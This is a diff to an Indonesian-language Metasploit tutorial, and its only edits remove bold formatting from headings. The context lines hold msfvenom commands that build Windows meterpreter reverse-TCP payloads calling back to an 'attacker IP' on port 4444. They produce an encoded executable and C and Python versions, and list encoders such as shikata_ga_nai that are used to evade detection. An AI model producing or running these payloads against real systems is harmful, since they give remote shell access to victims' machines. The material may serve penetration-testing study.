@@ -21,7 +21,7 @@ Gunakan encoder saat membuat payload:
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o shell_encoded.exe
 ```
 
-**Keterangan:**
+Keterangan:
 - `-p`: Jenis payload: `windows/meterpreter/reverse_tcp`
 - `LHOST`: IP Attacker: `192.168.1.100`
 - `LPORT`: Port listener: `4444`
@@ -30,13 +30,13 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x8
 - `-f`: Format payload: `exe`
 - `-o`: Nama file hasil payload: `shell_encoded.exe` 
 
-**Encoder Populer di Metasploit:**
+Encoder Populer di Metasploit:
 - `x86/shikata_ga_nai`
 - `cmd/powershell_base64`
 - `x86/countdown`
 - `x86/jmp_call_additive`
 
-**Cek Semua Encoder:**
+Cek Semua Encoder:
 
 ```
 msfvenom --list encoders
@@ -50,7 +50,7 @@ msfvenom --list encoders
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c -o payload.c
    ```
 
-   **Keterangan:**
+   Keterangan:
    - `-p` : Jenis payload: `windows/meterpreter/reverse_tcp`
    - `LHOST` : IP Attacker: `192.168.1.100`
    - `LPORT` : Port listener: `4444`
@@ -66,7 +66,7 @@ msfvenom --list encoders
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python -o payload.py
    ```
 
-   **Keterangan:**
+   Keterangan:
    - `-p` : Jenis payload: `windows/meterpreter/reverse_tcp`
    - `LHOST` : IP Attacker: `192.168.1.100`
    - `LPORT` : Port listener: `4444`
